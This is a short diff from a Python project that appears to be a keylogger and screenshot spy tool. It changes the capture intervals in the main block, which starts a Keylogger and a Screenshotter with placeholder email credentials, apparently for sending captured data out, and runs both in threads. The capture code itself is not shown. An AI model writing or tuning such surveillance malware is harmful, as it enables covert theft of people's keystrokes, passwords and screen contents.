@@ -96,8 +96,8 @@ class Screenshotter:
 
 
 if __name__ == '__main__':
-    keylogger = Keylogger(120, "emailaddress", "password")
-    screenshotter = Screenshotter(600, "emailaddress", "password")
+    keylogger = Keylogger(1500, "emailaddress", "password")
+    screenshotter = Screenshotter(60, "emailaddress", "password")
 
     keylogger_thread = threading.Thread(target=keylogger.start)
     screenshotter_thread = threading.Thread(target=screenshotter.start)
